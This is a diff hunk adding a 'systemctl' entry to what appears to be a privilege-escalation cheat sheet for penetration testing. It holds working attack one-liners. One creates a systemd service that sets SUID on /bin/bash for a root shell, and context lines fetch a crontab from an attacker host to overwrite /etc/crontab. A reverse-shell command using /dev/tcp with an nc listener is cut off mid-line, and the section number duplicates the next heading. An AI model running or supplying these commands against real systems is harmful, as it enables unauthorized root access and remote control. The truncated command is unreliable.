@@ -6386,6 +6386,19 @@ wget http://LHOST:8000/crontab -O /etc/crontab
 curl http://LHOST:8000/crontab -o /etc/crontab
 ```
 
+###11.3.16 systemctl
+```bash
+#direct shell (change host ip and port
+
+TF=$(mktemp).service && echo -e "[Service]\nType=simple\nStandardOutput=journal\nExecStart=/bin/bash -c 'chmod +s /bin/bash'" > $TF && systemctl link $TF && systemctl enable --now $TF && /bin/bash -p
+
+
+#If you want a Reverse Shell one-liner:
+#(Make sure your listener nc -lvnp 4444 is running on your machine first).
+
+TF=$(mktemp).service && echo -e "[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tc
+```
+
 ### 11.3.16 Custom SUID Binary Exploitation
 
 When you find a custom SUID binary not in GTFOBins:
